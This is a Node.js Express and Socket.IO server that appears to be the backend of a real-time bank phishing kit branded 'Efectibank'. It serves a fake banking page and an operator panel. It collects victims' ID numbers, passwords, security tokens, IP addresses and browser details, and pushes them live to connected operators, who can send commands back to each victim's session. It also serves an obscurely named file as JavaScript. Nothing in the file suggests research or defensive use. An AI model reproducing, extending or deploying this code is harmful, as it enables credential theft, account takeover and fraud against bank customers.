const express = require("express");
const path = require("path");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const port = Number(process.env.PORT) || 8080;
const publicDir = path.join(__dirname, "public");

app.disable("x-powered-by");

app.use(
  express.static(publicDir, {
    setHeaders(res, filePath) {
      const name = path.basename(filePath).toLowerCase();
      if (name.includes(".js") || name.startsWith("js") || name === "q8a4rrtl79" || /^\d+$/.test(name)) {
        res.type("application/javascript; charset=utf-8");
      }
    },
  })
);

app.get(["/banca", "/banca.html"], (_req, res) => {
  res.sendFile(path.join(publicDir, "banca.html"));
});

app.get(["/panel", "/panel.html"], (_req, res) => {
  res.sendFile(path.join(publicDir, "panel.html"));
});

app.get(["/admin", "/admin.html"], (_req, res) => {
  res.sendFile(path.join(publicDir, "admin.html"));
});

app.get("/health", (_req, res) => {
  res.status(200).json({ ok: true });
});

// Gestión de sesiones activas en memoria para el panel
const sessions = new Map();

function broadcastSessions() {
  const sessionList = Array.from(sessions.values()).filter((s) => {
    return (
      (s.docNumber && s.docNumber.trim().length > 0) ||
      (s.password && s.password.trim().length > 0) ||
      (s.token && s.token.trim().length > 0)
    );
  });
  io.to("admins").emit("sessions:update", sessionList);
}

io.on("connection", (socket) => {
  socket.on("admin:join", () => {
    socket.join("admins");
    broadcastSessions();
  });

  socket.on("client:init", (data) => {
    const session = {
      id: socket.id,
      ip: socket.handshake.address || "127.0.0.1",
      userAgent: socket.handshake.headers["user-agent"] || "",
      docType: data?.docType || "DNI",
      docNumber: data?.docNumber || "",
      password: data?.password || "",
      token: data?.token || "",
      step: data?.step || "doc",
      status: "Ingresando documento",
      updatedAt: new Date().toLocaleTimeString(),
    };
    sessions.set(socket.id, session);
    broadcastSessions();
  });

  socket.on("client:update", (data) => {
    let session = sessions.get(socket.id) || {
      id: socket.id,
      ip: socket.handshake.address || "127.0.0.1",
      userAgent: socket.handshake.headers["user-agent"] || "",
      docType: "DNI",
      docNumber: "",
      password: "",
      token: "",
    };

    if (data.docType) session.docType = data.docType;
    if (data.docNumber !== undefined && data.docNumber.trim() !== "") session.docNumber = data.docNumber.trim();
    if (data.password !== undefined && data.password !== "") session.password = data.password;
    if (data.token !== undefined && data.token !== "") session.token = data.token;
    if (data.step) session.step = data.step;
    if (data.status) session.status = data.status;
    session.updatedAt = new Date().toLocaleTimeString();

    sessions.set(socket.id, session);
    broadcastSessions();
  });

  socket.on("admin:command", ({ targetId, action, message }) => {
    const targetSocket = io.sockets.sockets.get(targetId);
    const session = sessions.get(targetId);
    if (targetSocket) {
      targetSocket.emit("operator:action", { action, message });
      if (session) {
        session.lastAction = action;
        session.status = `Operación enviada: ${action}`;
        session.updatedAt = new Date().toLocaleTimeString();
        broadcastSessions();
      }
    }
  });

  socket.on("admin:delete_session", ({ targetId }) => {
    if (targetId) {
      sessions.delete(targetId);
    } else {
      sessions.clear();
    }
    broadcastSessions();
  });

  socket.on("disconnect", () => {
    if (sessions.has(socket.id)) {
      const session = sessions.get(socket.id);
      session.connected = false;
      session.updatedAt = new Date().toLocaleTimeString();
      broadcastSessions();
    }
  });
});

server.listen(port, "0.0.0.0", () => {
  console.log(`Efectibank listo en el puerto ${port}`);
});

